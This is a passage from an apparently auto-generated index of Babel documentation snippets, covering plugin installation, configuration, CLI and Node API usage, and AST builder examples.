\"@babel/plugin-syntax-pipeline-operator\", { \"topicToken\": \"@@\" } ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript type-only imports and exports\nDESCRIPTION: Illustrates the usage of `type` modifier for explicitly marking imports and exports as type-only in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_4\n\nLANGUAGE: TypeScript\nCODE:\n```\nimport type { SomeThing } from \"./some-module.js\";\n\nexport type { SomeThing };\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: Executes the Babel CLI, specifying the @babel/plugin-syntax-export-namespace-from plugin. This allows Babel to parse 'export namespace from' syntax in the provided script.js file.  The Shell title indicates the context for the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-namespace-from.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-export-namespace-from script.js\n```\n\n----------------------------------------\n\nTITLE: Transforming Class Properties - Default Behavior - JavaScript\nDESCRIPTION: This code snippet demonstrates the default behavior of the `babel-plugin-transform-class-properties` plugin, which utilizes `Object.defineProperty` for class properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Bork {\n  static a = 'foo';\n  x = 'bar';\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Bork {\n  constructor() {\n    Object.defineProperty(this, \"x\", {\n      configurable: true,\n      enumerable: true,\n      writable: true,\n      value: 'bar'\n    });\n  }\n};\n\nObject.defineProperty(Bork, \"a\", {\n  configurable: true,\n  enumerable: true,\n  writable: true,\n  value: 'foo'\n});\n```\n\n----------------------------------------\n\nTITLE: Installing lab-babel with npm (convertible to yarn)\nDESCRIPTION: This shell command installs the `lab-babel` package as a development dependency. `lab-babel` is likely used for testing Babel-related projects. The `npm2yarn` directive indicates that this command can be translated into its equivalent using `yarn add --dev lab-babel`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/lab/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev lab-babel\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API (JavaScript)\nDESCRIPTION: Uses the Babel Node API to transform code with the @babel/plugin-syntax-partial-application plugin. The plugin enables parsing of the partial application syntax. It requires the @babel/core package to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-partial-application.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-partial-application\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Symbols Example JavaScript\nDESCRIPTION: This code demonstrates the use of symbols for creating module-scoped private properties. It creates a symbol `key` and uses it as a property key within the `MyClass`.  Limited support is available via polyfill. Accessing the symbol from outside the module returns undefined.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_27\n\nLANGUAGE: JavaScript\nCODE:\n```\n(function() {\n\n  // module scoped symbol\n  var key = Symbol(\"key\");\n\n  function MyClass(privateData) {\n    this[key] = privateData;\n  }\n\n  MyClass.prototype = {\n    doStuff: function() {\n      ... this[key] ...\n    }\n  };\n\n  // Limited support from Babel, full support requires native implementation.\n  typeof key === \"symbol\"\n})();\n\nvar c = new MyClass(\"hello\")\nc[\"key\"] === undefined\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: This command-line instruction demonstrates how to use the Babel CLI to transform a JavaScript file ('script.js') using the @babel/plugin-transform-unicode-regex plugin.  It directly specifies the plugin to use during the Babel compilation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-regex.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-unicode-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration: iterableIsArray Assumption\nDESCRIPTION: This JSON configuration file demonstrates using the `iterableIsArray` assumption to optimize destructuring. When set to `true`, it assumes the iterable being destructured is an array, avoiding the use of `Array.from` for better performance in scenarios where this assumption holds.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"iterableIsArray\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Nullish Coalescing Operator Input JavaScript\nDESCRIPTION: Demonstrates the nullish coalescing operator (??) in JavaScript.  If `object.foo` is null or undefined, the variable `foo` is assigned the value \"default\". This is the input code that the babel plugin transforms.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = object.foo ?? \"default\";\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via CLI\nDESCRIPTION: Executes the Babel CLI with the @babel/plugin-syntax-object-rest-spread plugin enabled. This allows Babel to parse object rest and spread syntax when processing the specified JavaScript file. It takes the input script file as a parameter.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-object-rest-spread.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-object-rest-spread script.js\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin: JSON\nDESCRIPTION: This JSON configuration snippet shows how to enable the `@babel/plugin-transform-reserved-words` plugin in a `babel.config.json` file. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-reserved-words.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-reserved-words\"]\n}\n```\n\n----------------------------------------\n\nTITLE: ES Module to SystemJS Transformation\nDESCRIPTION: Demonstrates the transformation of a simple ES module export to its SystemJS equivalent.  The original JavaScript code exports a default value, and the transformed code uses `System.register` to define the module and export the same value. This snippet illustrates the core functionality of the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-systemjs.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default 42;\n```\n\n----------------------------------------\n\nTITLE: JSON Module Import\nDESCRIPTION: This code snippet shows an example of how to import a JSON file using the `import ... with { type: \"json\" }` syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nimport data from \"./data.json\" with { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: For Await Example\nDESCRIPTION: This JavaScript code demonstrates the usage of `for await` to iterate over an asynchronous iterable. The plugin transforms this to ensure compatibility with older environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function f() {\n  for await (let x of y) {\n    g(x);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Import Reflection in Babel 7\nDESCRIPTION: Demonstrates import reflection in Babel 7, which allows importing modules as objects.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_33\n\nLANGUAGE: javascript\nCODE:\n```\nimport module foo from \"./foo.wasm\";\n```\n\n----------------------------------------\n\nTITLE: Install @babel/polyfill using npm\nDESCRIPTION: This shell command installs the @babel/polyfill package as a dependency to the project. Note that this package is deprecated in favor of directly including `core-js/stable`. The `--save` option adds the package to the project's `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save @babel/polyfill\n```\n\n----------------------------------------\n\nTITLE: JavaScript Class Transformation (Default)\nDESCRIPTION: Illustrates how Babel transforms a JavaScript class by default. The transformation includes a `_classCallCheck` function to ensure that the class constructor is called with `new`. Input code must be valid JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction _classCallCheck(instance, Constructor) {\n  if (!(instance instanceof Constructor)) {\n    throw new TypeError(\"Cannot call a class as a function\");\n  }\n}\n\nlet Test = function Test() {\n  _classCallCheck(this, Test);\n\n  this.x = 2;\n};\n\n// You can test the thrown error in the console:\n// Uncaught TypeError: class constructors must be invoked with 'new'\nTest();\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeAliasDeclaration Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTypeAliasDeclaration` AST node using Babel's `t.tsTypeAliasDeclaration` method. It requires an identifier, optional type parameters, and a type annotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_210\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeAliasDeclaration(id, typeParameters, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Running babel-upgrade with flags (Shell)\nDESCRIPTION: This command runs the `babel-upgrade` tool using `npx` with the `--write` and `--install` flags. The `--write` flag modifies the files in place, and `--install` installs the necessary dependencies. It upgrades dependencies in `package.json` and `.babelrc` config.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel-upgrade --write --install\n```\n\n----------------------------------------\n\nTITLE: Export Default From in Babel 8\nDESCRIPTION: Demonstrates the export default from syntax in Babel 8. It allows exporting a default export from another module in a concise manner.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nexport v from \"mod\"\n```\n\n----------------------------------------\n\nTITLE: Rest Parameters in JavaScript\nDESCRIPTION: Illustrates the use of rest parameters in ES2015 functions. Rest parameters allow a function to accept an indefinite number of arguments as an array. This simplifies handling variable-length argument lists.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction f(x, ...y) {\n  // y is an Array\n  return x * y.length;\n}\nf(3, \"hello\", true) == 6\n```\n\n----------------------------------------\n\nTITLE: Nullish Coalescing Operator Output JavaScript\nDESCRIPTION: Shows the transformed JavaScript code after applying the @babel/plugin-transform-nullish-coalescing-operator. The nullish coalescing operator is converted to a series of checks to ensure compatibility with older JavaScript environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _object$foo;\n\nvar foo =\n  (_object$foo = object.foo) !== null && _object$foo !== void 0\n    ? _object$foo\n    : \"default\";\n```\n\n----------------------------------------\n\nTITLE: Creating a CallExpression Node\nDESCRIPTION: Creates an AST node representing a call expression. Requires `callee` (an `Expression | Super | V8IntrinsicIdentifier`) and `arguments` (an array of `Expression | SpreadElement | ArgumentPlaceholder`). Use `t.isCallExpression(node, opts)` to check if a node is a CallExpression and `t.assertCallExpression(node, opts)` to assert that a node is a CallExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.callExpression(callee, arguments);\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via Node API\nDESCRIPTION: Transforms JavaScript code using the Babel Node API with the @babel/plugin-syntax-class-static-block plugin.  Requires the @babel/core package. The transformed code is returned synchronously.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-static-block.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-class-static-block\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Template Literal Usage with `.ast` in @babel/template (JavaScript)\nDESCRIPTION: This snippet demonstrates using the `.ast` property of @babel/template with template literals to directly parse a string into an AST, even with template literal replacements. Requires @babel/template.\nSOURCE: https://github.com/babel/website/blob/main/docs/template.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst name = \"my-module\";\nconst mod = \"myModule\";\n\nconst ast = template.ast`\n  var ${mod} = require(\"${name}\");\n`;\n```\n\n----------------------------------------\n\nTITLE: Complex Do Expression Example\nDESCRIPTION: This snippet showcases a more complex `do` expression with nested `if ... else` chains.  It evaluates multiple conditions based on the values of `x` and `y` and assigns a value to the variable `a`. Requires JavaScript runtime environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-do-expressions.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet x = 100;\nlet y = 20;\n\nlet a = do {\n  if (x > 10) {\n    if (y > 20) {\n      (\"big x, big y\");\n    } else {\n      (\"big x, small y\");\n    }\n  } else {\n    if (y > 10) {\n      (\"small x, big y\");\n    } else {\n      (\"small x, small y\");\n    }\n  }\n};\n```\n\n----------------------------------------\n\nTITLE: Using @babel/preset-stage-0 via Node API\nDESCRIPTION: Transforms JavaScript code using the @babel/preset-stage-0 preset via the Babel Node API. Requires the @babel/core package.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-stage-0\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-bigint via CLI\nDESCRIPTION: Uses the Babel CLI to transform a script with the @babel/plugin-syntax-bigint plugin. This allows processing files containing BigInt syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-bigint.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-bigint script.js\n```\n\n----------------------------------------\n\nTITLE: Create Import Declaration AST Node (JavaScript)\nDESCRIPTION: Creates an `ImportDeclaration` AST node using the `t.importDeclaration` builder. This node represents an import declaration statement. Parameters include an array of import specifiers and the source module as a string literal.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_81\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.importDeclaration(specifiers, source);\n```\n\n----------------------------------------\n\nTITLE: Creating Mixed Type Annotation in JavaScript\nDESCRIPTION: This snippet creates a `MixedTypeAnnotation` AST node using Babel's `t.mixedTypeAnnotation` builder. It takes no parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_112\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.mixedTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM\nDESCRIPTION: This command installs the babel-plugin-transform-merge-sibling-variables package as a development dependency using npm. It allows the plugin to be used within a Babel project for transforming JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-merge-sibling-variables.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-merge-sibling-variables --save-dev\n```\n\n----------------------------------------\n\nTITLE: Registering a custom Babel plugin\nDESCRIPTION: This shows how to register a custom Babel plugin using the Babel.registerPlugin method. This allows you to extend Babel's functionality with your own transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n// Simple plugin that converts every identifier to \"LOL\"\nfunction lolizer() {\n  return {\n    visitor: {\n      Identifier(path) {\n        path.node.name = \"LOL\";\n      },\n    },\n  };\n}\nBabel.registerPlugin(\"lolizer\", lolizer);\n```\n\n----------------------------------------\n\nTITLE: Installing Decorators Plugin with npm\nDESCRIPTION: This command installs the `@babel/plugin-proposal-decorators` package as a development dependency using npm. The `--save-dev` flag ensures that the package is added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/plugin-proposal-decorators --save-dev\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectProperty in JavaScript\nDESCRIPTION: This code snippet shows how to create an `ObjectProperty` AST node using `t.objectProperty(key, value, computed, shorthand, decorators)`.  It defines a property within an object literal. Parameters include the property's key, value, and flags for computed keys and shorthand syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_125\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectProperty(key, value, computed, shorthand, decorators);\n```\n\n----------------------------------------\n\nTITLE: Installing core-js for Polyfills\nDESCRIPTION: This shell command installs the `core-js` package as a project dependency. `core-js` provides polyfills for modern JavaScript features, ensuring compatibility across different JavaScript environments. It is particularly useful for projects targeting older browsers or environments that lack native support for newer language features.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/mocha/usage.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n# Polyfills for builtin methods\nnpm install --save core-js\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Preset Babili\nDESCRIPTION: This snippet shows how to install `babel-preset-babili` as a development dependency using npm. This preset allows Babili to be used with Babel projects.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install babel-preset-babili --save-dev\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript code shows how to use the babel-plugin-minify-dead-code-elimination plugin programmatically via the Node API. The transformSync function is used to transform the provided code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-dead-code-elimination.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-dead-code-elimination\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI\nDESCRIPTION: Command-line usage of the Babel CLI to transform a JavaScript file (script.js) using the @babel/plugin-transform-react-jsx-development plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-jsx-development script.js\n```\n\n----------------------------------------\n\nTITLE: Install plugin using npm or yarn\nDESCRIPTION: This command installs the @babel/plugin-proposal-optional-chaining-assign package as a development dependency using npm or yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-optional-chaining-assign.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-optional-chaining-assign\n```\n\n----------------------------------------\n\nTITLE: Installing Dynamic Import Plugin\nDESCRIPTION: Installs the @babel/plugin-syntax-dynamic-import plugin as a development dependency using npm. This plugin allows Babel to parse dynamic import() syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-dynamic-import\n```\n\n----------------------------------------\n\nTITLE: Configuring the plugin in babel.config.json\nDESCRIPTION: This configuration file specifies that the @babel/plugin-transform-unicode-property-regex plugin should be used by Babel. This enables the transformation of Unicode property escapes in regular expressions during the build process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-property-regex.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-unicode-property-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TSExternalModuleReference Node in JavaScript\nDESCRIPTION: This code snippet demonstrates how to create a `TSExternalModuleReference` AST node with `t.tsExternalModuleReference`. It takes a string literal representing the external module reference. This is used for referencing external modules within TypeScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_174\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsExternalModuleReference(expression);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with babel.config.json\nDESCRIPTION: Configures Babel to use the @babel/plugin-bugfix-firefox-class-in-computed-class-key plugin by adding it to the plugins array in the babel.config.json file. This is the recommended method for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-firefox-class-in-computed-class-key.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-bugfix-firefox-class-in-computed-class-key\"]\n}\n```\n\n----------------------------------------\n\nTITLE: TSFunctionType Parameters/ReturnType Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `parameters` to `params` and `typeAnnotation` to `returnType` in TSFunctionType.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_20\n\nLANGUAGE: typescript\nCODE:\n```\ntype Bar = (x: number) => string;\n```\n\n----------------------------------------\n\nTITLE: Installing the Plugin via npm/yarn\nDESCRIPTION: Installs the @babel/plugin-syntax-nullish-coalescing-operator package as a development dependency using npm or yarn. This allows Babel to parse the nullish coalescing operator syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-nullish-coalescing-operator.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-nullish-coalescing-operator\n```\n\n----------------------------------------\n\nTITLE: Creating a Rest Element Node in Babel\nDESCRIPTION: Creates a `RestElement` AST node using the Babel types module. This node represents a rest element in destructuring, requiring an argument (LVal).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_146\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.restElement(argument);\n```\n\n----------------------------------------\n\nTITLE: Symbol.metadata Polyfill (JavaScript)\nDESCRIPTION: Provides a polyfill for `Symbol.metadata` to ensure compatibility when using decorators that access or modify metadata.  It defines `Symbol.metadata` if it's not already available, defaulting to `Symbol.for(\"Symbol.metadata\")`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nSymbol.metadata = Symbol.for(\"Symbol.metadata\");\n```\n\n----------------------------------------\n\nTITLE: Async Generator Example Usage JavaScript\nDESCRIPTION: Shows a complete example of using async generators and `for-await` loops. It defines an async generator function `genAnswers` that processes a stream of Promises and yields cumulative totals.  It also includes a `forEach` function to consume the async generator.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function* genAnswers() {\n  var stream = [ Promise.resolve(4), Promise.resolve(9), Promise.resolve(12) ];\n  var total = 0;\n  for await (let val of stream) {\n    total += await val;\n    yield total;\n  }\n}\n\nfunction forEach(ai, fn) {\n  return ai.next().then(function (r) {\n    if (!r.done) {\n      fn(r);\n      return forEach(ai, fn);\n    }\n  });\n}\n\nvar output = 0;\nreturn forEach(genAnswers(), function(val) { output += val.value })\n.then(function () {\n  assert.equal(output, 42);\n});\n```\n\n----------------------------------------\n\nTITLE: @babel/compat-data - Plugin Rename Migration\nDESCRIPTION: This example demonstrates the renaming of stage 4 plugin entries in `plugins.json` from `proposal-*` to `transform-*` within `@babel/compat-data`. It details how the isRequired function is affected, requiring updates to plugin names when checking target support. This ensures compatibility with Babel 8's new naming conventions. Dependencies: `@babel/compat-data`, `@babel/helper-compilation-targets`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_75\n\nLANGUAGE: diff\nCODE:\n```\nmodule.exports = api => {\n  const targets = api.targets();\n  // The targets have native optional chaining support\n  // if `transform-optional-chaining` is _not_ required\n  const optionalChainingSupported = !isRequired(\n-   \"proposal-optional-chaining\",\n+   \"transform-optional-chaining\",\n    targets\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Creating Member Expression in JavaScript\nDESCRIPTION: This snippet creates a `MemberExpression` AST node using Babel's `t.memberExpression` builder. It requires `object` (Expression or Super), `property` (Expression if computed, Identifier otherwise), `computed` (boolean, default false), and `optional` (boolean, default null).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_110\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.memberExpression(object, property, computed, optional);\n```\n\n----------------------------------------\n\nTITLE: Invalid Variable Declarator Example in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how Babel 8 rejects invalid variable declarators, such as `var [x]` without an initializer, when using the `t.variableDeclaration` and `t.variableDeclarator` builders.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_56\n\nLANGUAGE: javascript\nCODE:\n```\n// var [x] is invalid without an initializer\n// highlight-error-next-line\nt.variableDeclaration(\"var\", [\n  // highlight-error-next-line\n  t.variableDeclarator(t.arrayPattern([t.identifier(\"x\")]))\n  // highlight-error-next-line\n]);\n```\n\n----------------------------------------\n\nTITLE: Creating an AssignmentPattern Node\nDESCRIPTION: Creates an AST node representing an assignment pattern. Requires `left` (an `Identifier | ObjectPattern | ArrayPattern | MemberExpression | TSAsExpression | TSSatisfiesExpression | TSTypeAssertion | TSNonNullExpression`) and `right` (an `Expression`). Use `t.isAssignmentPattern(node, opts)` to check if a node is an AssignmentPattern and `t.assertAssignmentPattern(node, opts)` to assert that a node is an AssignmentPattern.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.assignmentPattern(left, right);\n```\n\n----------------------------------------\n\nTITLE: Installing React JSX Source Babel Plugin\nDESCRIPTION: This command installs the `@babel/plugin-transform-react-jsx-source` plugin as a development dependency using npm.  It allows adding file and line number information to JSX elements during the build process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-source.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-react-jsx-source\n```\n\n----------------------------------------\n\nTITLE: Fourth Revision of replace-top-level-this-plugin (JS)\nDESCRIPTION: This revision introduces `requeueComputedKeyAndDecorators` to handle `this` within computed class elements. It ensures that the computed key is visited even if the class method is skipped, addressing an edge case not handled by previous revisions.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nimport {\n  requeueComputedKeyAndDecorators\n} from \"@babel/helper-environment-visitor\";\n\nmodule.exports = (api) => {\n  const { types: t } = api;\n  return {\n    name: \"replace-top-level-this\",\n    visitor: {\n      ThisExpression(path) {\n        path.replaceWith(t.identifier(\"globalThis\"));\n      }\n      FunctionParent(path) {\n        if (!path.isArrowFunctionExpression()) {\n          path.skip();\n        }\n        if (path.isMethod()) {\n          requeueComputedKeyAndDecorators(path);\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installation via npm\nDESCRIPTION: This command installs the @babel/plugin-transform-destructuring plugin as a development dependency using npm. This makes the plugin available to Babel for transforming destructuring syntax in your JavaScript code during the build process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-destructuring\n```\n\n----------------------------------------\n\nTITLE: Import and Use getFixtures in JavaScript\nDESCRIPTION: This code snippet demonstrates how to import the `getFixtures` function from the `@babel/helper-fixtures` package and use it to load test fixtures from a specified directory. It defines type definitions for test files, individual tests, and test suites. The `getFixtures` function takes a directory path as input and returns an array of test suites.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-fixtures.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport getFixtures from \"@babel/helper-fixtures\";\n\ntype TestFile = {\n  loc: string;\n  code: string;\n  filename: string;\n};\n\ntype Test = {\n  title: string;\n  disabled: boolean;\n  options: Object;\n  exec: TestFile;\n  actual: TestFile;\n  expected: TestFile;\n};\n\ntype Suite = {\n  options: Object;\n  tests: Array<Test>;\n  title: string;\n  filename: string;\n};\n\nlet fixtures: Array<Suite> = getFixtures(\"/User/sebmck/Projects/babel-something/test/fixtures\");\n```\n\n----------------------------------------\n\nTITLE: Named capturing groups regex transformation in JavaScript\nDESCRIPTION: Demonstrates how the plugin transforms a regular expression with named capturing groups. It shows the input regular expression and the output after the transformation by the Babel plugin, which uses the `_wrapRegExp` helper function to add named capturing groups support.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-named-capturing-groups-regex.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar re = /(?<year>\\d{4})-(?<month>\\d{2})-(?<day>\\d{2})/;\n\nconsole.log(re.exec(\"1999-02-29\").groups.year);\n```\n\n----------------------------------------\n\nTITLE: Launch a REPL using babel-node\nDESCRIPTION: Launches a Read-Eval-Print-Loop (REPL) using babel-node. This allows you to interactively execute JavaScript code that is compiled by Babel on the fly.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel-node\n```\n\n----------------------------------------\n\nTITLE: Configuring Pipeline Operator Plugin with Proposal Option\nDESCRIPTION: This snippet shows how to configure the `@babel/plugin-proposal-pipeline-operator` plugin, explicitly setting the `proposal` option to `minimal`.  This is required for Stage < 2 proposals.  It prevents errors by opting into a specific proposal.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_30\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"plugins\": [\n-   \"@babel/plugin-proposal-pipeline-operator\"\n+   [\"@babel/plugin-proposal-pipeline-operator\", { \"proposal\": \"minimal\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Plugin via NPM\nDESCRIPTION: This command installs the @babel/plugin-syntax-unicode-sets-regex package as a development dependency using npm.  It ensures that the plugin is available during the build process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-unicode-sets-regex.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-unicode-sets-regex\n```\n\n----------------------------------------\n\nTITLE: Plugin Configuration with Options (JSON)\nDESCRIPTION: This 